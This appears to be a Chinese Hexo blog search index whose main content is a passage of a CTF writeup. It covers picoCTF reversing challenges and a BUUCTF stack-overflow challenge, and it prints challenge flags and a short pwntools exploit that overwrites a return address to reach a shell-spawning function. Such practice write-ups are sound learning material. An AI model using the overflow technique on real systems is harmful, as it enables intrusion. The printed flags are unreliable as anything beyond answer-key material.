src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-138.png" alt="img"></p><p>这是我们处理后的ASCII码(放在in.txt里)↑</p><p>然后写脚本转换为字符串(注意最开头的34被删了,因为它是字符串的长度),这里我使用c++:</p><p>之所以不使用我最擅长的c是因为c++的STL算法库有reverse函数</p><p>暂时无法在飞书文档外展示此内容</p><p>运行:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-139.png" alt="img"></p><p>结束…</p><h2 id="bbbbloat">Bbbbloat:</h2><p>直接拖IDA里看main:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-140.png" alt="img"></p><p>直接输549255就行:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-141.png" alt="img"></p><p>结束…</p><h2 id="unpackme">Unpackme:</h2><p>这里提示upx脱壳</p><p>首先扔进DIE里看看,发现有UPX加壳(注意是ELF64—Linux):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-142.png" alt="img"></p><p>所以我们去下载UPX进行脱壳(就是第一个):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-143.png" alt="img"></p><p>免安装,解压后即可使用(xz先解压然后tar解包):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-144.png" alt="img"></p><p>脱壳后再检测发现已经没有壳了:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-145.png" alt="img"></p><p>丢进IDA即可(代码一看就懂—第17行):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420727-146.png" alt="img"></p><p>运行:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-147.png" alt="img"></p><p>结束…</p><h2 id="keygenme">Keygenme:</h2><p>我懂那个意思…运行到字符串比较,然后直接看v14变量就行</p><p>但是我的IDA各种问题无法调试…正在重装…</p><p>装好了…IDA远程调试看看这篇文章:</p><p><a href="https://blog.csdn.net/abc_670/article/details/80066817">远程调试</a></p><p>好现在上题:</p><p>至于IDA里打开就不说了,直接找到main函数里if语句调用的函数,如果发现是类似&amp;func+1这样的就F5重新反编译一下一般就可以了:</p><p>经过分析发现flag存在v17[[32-67]那么直接在v17处理后打断点调试就行:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-148.png" alt="img"></p><p>找到v17,观察(整理)出flag即可:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-149.png" alt="img"></p><p>picoCTF{br1ng_y0ur_0wn_k3y_9d74d90d}</p><p>结束…</p><h2 id="wizardlike">Wizardlike:</h2><p>运行一遍一看就是个纯地图</p><p>然后很多地方发现过不去—这不就穿墙挂么~~~</p><p>所以我们IDA吧…别问我怎么找到那个函数的…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-150.png" alt="img"></p><p>没错就是这里↑</p><p>看来是判断是否越界的函数了…(类似我以前写的贪吃蛇的is_over_lap()和againstTheWall()函数):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-151.png" alt="img"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-152.png" alt="img"></p><p>好了帮助理解结束了,现在直接把返回的0LL全改成非0就行(之所以没说改成1LL是因为我把小端和大端搞反了—我是菜逼):</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-153.png" alt="img"></p><p>然后保存就行,接下来直接跑代码观察地图就行,发现地图的形状就是flag~~</p><p>跑吧~~</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-154.png" alt="img"></p><p>地图贼反人类…慢慢看吧…</p><p>picoCTF{ur_4_w1z4rd_4844AD6F}</p><p>好像每个人的地图还不一样…</p><p>结束…</p><h1 id="pwn">PWN:</h1><h2 id="test-your-nc">test_your_nc:</h2><p>很简单,运行就知道是获取到shell了</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-155.png" alt="img"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-156.png" alt="img"></p><p>但是作为PWN手我们要用正确的解题方式</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-157.png" alt="img"></p><p>丢IDA里F5大法,不用解释</p><p>结束…</p><h2 id="rip">Rip:</h2><h3 id="总体分析">总体分析:</h3><p>先运行,发现有输入(盲猜gets()),丢IDA吧…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420728-158.png" alt="img"></p><p>好,盲猜正确…接下来该面向google解题了…</p><p>看看有没有其他可利用的函数—&gt;找到了fun():</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-159.png" alt="img"></p><p>于是我们就要想办法跳转到这个函数,从而获得shell入口</p><h3 id="如何构造字符串">如何构造字符串:</h3><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-160.png" alt="img"></p><p>可以发现s变量占15字节(反编译也能看出来char s[15])</p><p>现在问题来了,我们要知道栈溢出的细节:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-161.png" alt="img"></p><p>用DIE工具查看该文件,发现是ELF64(废话),那么针对ELF64的分析如下:</p><p><a href="https://blog.csdn.net/weixin_43780092/article/details/126694251">基础知识可以看看这篇文章</a></p><p>因为本蒟蒻只会一点8086,所以也就大致先看看,有个概念再说…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-162.png" alt="img"></p><p>其实重点就是这张图↑</p><h3 id="对栈帧的分析-也就是分析上图">对栈帧的分析(也就是分析上图):</h3><p>首先要知道对于函数栈帧来讲,也就是对于堆栈而言,是从高地址向低地址分配的(所以对s的溢出会影响到上一个函数栈帧—我理解的应该没错)</p><p>那么我们要进行计算,首先是15字节的s数组,以任意值进行填充,然后是填充当前函数帧的ebp(对于ELF64而言,且其占用8字节—因为是64位机器),此时我们就有15+8==23字节了</p><p>接下来就是我们实际要覆盖的返回地址了,这里在IDA找到fun()函数的地址(0x401186)</p><p>于是我们在python中写exp(我的环境在linux安装,所以在linux下编写)—我也不知道我啥时候装的环境</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-163.png" alt="img"></p><p>代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29939</span>) <span class="comment">#靶机地址和端口</span></span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">15</span>+<span class="string">&#x27;B&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x401186</span>+<span class="number">1</span>).decode(<span class="string">&quot;iso-8859-1&quot;</span>)</span><br><span class="line"><span class="comment">#char s的15个字节+RBP的8字节+fun函数入口地址，+1为了堆栈平衡，p64()发送数据时，是发送的字节流，也就是比特流（二进制流）。</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-164.png" alt="img"></p><h3 id="问题来了">问题来了:</h3><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/1690454420729-165.png" alt="img"></p><p>是的没错,玄学,这个问题先放在这里吧,暂时搞不了…(哪天回头再看看吧,有地方没理解到位)</p><p>而且那个堆栈平衡以后也得仔细看看…</p><p>​      勉强算是结束了吧…</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> PWN </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客文档建立日志</title>
      <link href="/2023-06-02-54d71795c077/"/>
      <url>/2023-06-02-54d71795c077/</url>
      
        <content type="html"><![CDATA[<h2 id="markdown文件-yaml-front-matter-快捷信息备份">markdown文件 YAML Front Matter 快捷信息备份</h2><p>2023.07.27</p><table><thead><tr><th style="text-align:left">写法</th><th>解释</th></tr></thead><tbody><tr><td style="text-align:left">title</td><td>【必需】文章标题</td></tr><tr><td style="text-align:left">date</td><td>【必需】文章创建日期(实际博客网页会自动同步,可以不加)</td></tr><tr><td style="text-align:left">updated</td><td>【可选】文章更新日期</td></tr><tr><td style="text-align:left">tags</td><td>【可选】文章标签</td></tr><tr><td style="text-align:left">categories</td><td>【可选】文章分类</td></tr><tr><td style="text-align:left">keywords</td><td>【可选】文章关键字</td></tr><tr><td style="text-align:left">description</td><td>【可选】文章描述</td></tr></tbody></table><h1 id="none"></h1><h2 id="图床搭建">图床搭建</h2><p>2023.07.27</p><p>使用PicGo+阿里云OSS搭建:</p><p>typora测试PicGo app失败,但是后续测试发现成功</p><h3 id="关键报错问题">关键报错问题:</h3><p>​从飞书复制下来的markdown中的图片会上传失败,报错信息:</p><p>​No mime type found for file asynccode</p><p>​解决方案:</p><p>​暂未有直接的解决办法</p><p>​间接解决办法:</p><p>​将typora图片设置为自动保存到某个路径,从而自动生成图片路径为本地的一篇markdown,然后重新改回上传图片,将本地图片全部上传即可解决当前篇博客的图片问题.但是意味着不能每次从飞书这样操作,否则会非常麻烦.</p><h2 id="评论系统配置">评论系统配置</h2><p><s>2023.07.28</s></p><p><s>基于Twikoo评论系统,使用zeabur部署:</s></p><p><s>1.将github上Twikoo的仓库fork到自己的github中</s></p><p><s>2.配置zeabur服务</s></p><p><s>3.在Hexo框架中(butterfly主题支持该评论系统)对zeabur生成的域名进行连接</s></p><p><s>4.成功,部署到网站</s></p><p><s>2023.08.04</s></p><p><s>1.配置新评论邮箱提醒</s></p><p><s>2.配置Navicat16连接到评论数据库(MongoDB),可以进行评论的后台管理</s></p><p>zeabur使用免费计划,已被删库…</p><br><p>2023.11.6</p><p>基于Twikoo评论系统,换为Netlify部署.</p><p>按照文档搭建即可</p><h2 id="搜索功能">搜索功能</h2><p>添加本地搜索插件—hexo-generator-search</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装插件:</span></span><br><span class="line">npm install hexo-generator-search --save</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全局_config.yml中添加:</span></span><br><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  <span class="built_in">limit</span>: 10000</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 主题_config.yml中设置:</span></span><br><span class="line">local_search:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#注:template配置，无需配置该项,配置了反而无法正常搜索</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.baidu.com">https://www.baidu.com</a></p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类导航</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[<p>hello world</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/json-data/tools.json"/>
      <url>/json-data/tools.json</url>
      
        <content type="html"><![CDATA[[{"class_name":"CTF工具","class_desc":"常用在线工具","link_list":[{"name":"CyberChef","link":"https://icyberchef.com/","avatar":"/img/artical_pic.png","descr":"编码万能转换"},{"name":"密码破解","link":"http://www.atoolbox.net/Category.php?Id=27&Page=1","avatar":"/img/artical_pic.png","descr":"基本密码在线解密"},{"name":"正则表达式工具","link":"https://c.runoob.com/front-end/854/?optionGlobl=global","avatar":"/img/artical_pic.png","descr":"正则表达式在线处理"},{"name":"BrainF**k and Ook","link":"https://www.splitbrain.org/services/ook","avatar":"/img/artical_pic.png","descr":"某种玄学的东西"},{"name":"因数分解","link":"http://www.factordb.com/index.php","avatar":"/img/artical_pic.png","descr":"一个因数分解数据库"},{"name":"摩斯电码","link":"https://morsecode.world/international/decoder/audio-decoder-adaptive.html","avatar":"/img/artical_pic.png","descr":"不解释"},{"name":"图像处理","link":"https://onlinetools.com/image","avatar":"/img/artical_pic.png","descr":"图像的各种特殊处理"},{"name":"Java在线逆向","link":"http://javare.cn","avatar":"/img/artical_pic.png","descr":"可以class文件..."},{"name":"Awesome-Hacking","link":"https://blog.csdn.net/ZYC88888/article/details/113663486","avatar":"/img/artical_pic.png","descr":"CTF工具库"}]},{"class_name":"转换工具","class_desc":"格式转换的一些小工具","link_list":[{"name":"pdf转换工具","link":"https://www.alltoall.net/","avatar":"/img/artical_pic.png","descr":"文档在线转换"},{"name":"音频格式转换工具","link":"http://ncm.miidj.com/","avatar":"/img/artical_pic.png","descr":"方便使用播放器"},{"name":"操作系统文件格式转换","link":"http://tools.bugscaner.com/text/textconvert.html","avatar":"/img/artical_pic.png","descr":"在线文档格式windows unix macintosh互相转换"}]},{"class_name":"网络工具","class_desc":"网络相关的工具和资源","link_list":[{"name":"测速网","link":"https://www.speedtest.cn/","avatar":"/img/artical_pic.png","descr":"网速测试"},{"name":"Clash","link":"https://github.com/Dreamacro/clash/releases","avatar":"/img/artical_pic.png","descr":"Clash下载直达"},{"name":"虚拟手机号","link":"https://sms-activate.org/cn/getNumber","avatar":"/img/artical_pic.png","descr":"虚拟手机号服务"},{"name":"机场","link":"https://www.mojie.mx/#/login","avatar":"/img/artical_pic.png","descr":"懂?"}]},{"class_name":"其他工具","class_desc":"其他各种工具","link_list":[{"name":"文本对比工具","link":"https://tool.p2hp.com/tool-online-difftext/","avatar":"/img/artical_pic.png","descr":"在线文本对比"},{"name":"大数运算器","link":"https://goodcalculators.com/big-number-calculator/","avatar":"/img/artical_pic.png","descr":"高精度大数在线运算"},{"name":"阶乘运算器","link":"https://zh.numberempire.com/factorialcalculator.php","avatar":"/img/artical_pic.png","descr":"阶乘计算"}]},{"class_name":"创作与AI工具","class_desc":"AI,文档,表格,图像等创作工具","link_list":[{"name":"ChatGPT","link":"https://chat.openai.com/","avatar":"/img/ChatGPT.webp","descr":"学习的好帮手"},{"name":"在线作图工具","link":"https://www.processon.com/","avatar":"/img/artical_pic.png","descr":"免费在线流程图思维导图"}]},{"class_name":"技术文档","class_desc":"各种语言,框架,工具的文档","link_list":[{"name":"C/C++参考手册","link":"https://zh.cppreference.com/mwiki/index.php?title=%E9%A6%96%E9%A1%B5&variant=zh-cn","avatar":"/img/Logo/C_and_CPP.jpg","descr":"C和C++语言的在线参考手册"},{"name":"GTK文档","link":"https://www.gtk.org/docs/installations/windows/","avatar":"/img/Logo/logo-gtk-sm.png","descr":"GTK库的文档"},{"name":"Windows API 索引","link":"https://learn.microsoft.com/zh-cn/windows/win32/apiindex/windows-api-list","avatar":"/img/Logo/Microsoft.png","descr":"Windows API 的文档"}]}]]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>我的影子</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>在线工具</title>
      <link href="/tools/index.html"/>
      <url>/tools/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>我的标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[<p>hello world</p>]]></content>
      
    </entry>
    
    
  
</search>
